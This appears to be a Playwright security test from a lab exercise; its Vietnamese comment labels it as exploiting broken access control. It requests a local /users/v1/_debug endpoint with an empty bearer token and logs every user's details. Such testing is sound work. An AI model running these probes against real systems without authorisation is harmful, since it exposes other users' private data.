
// Kịch bản 2: Khai thác lỗ hổng Broken access control

import { test, expect } from '@playwright/test';
import { PlaywrightTestConfig } from '@playwright/test';
const accessToken = '';

const config: PlaywrightTestConfig = {
  use: {
    baseURL: 'http://localhost:5002',
    extraHTTPHeaders: {
      Authorization: `Bearer ${accessToken}`,
    },
  },
};
export default config;

test("Displays all details for all users", async ({ request }) => {
  const inforUser = await request.get(`/users/v1/_debug`);
  expect(inforUser.ok()).toBeTruthy();
  expect(inforUser.status()).toBe(200);
  console.log(await inforUser.json());
});
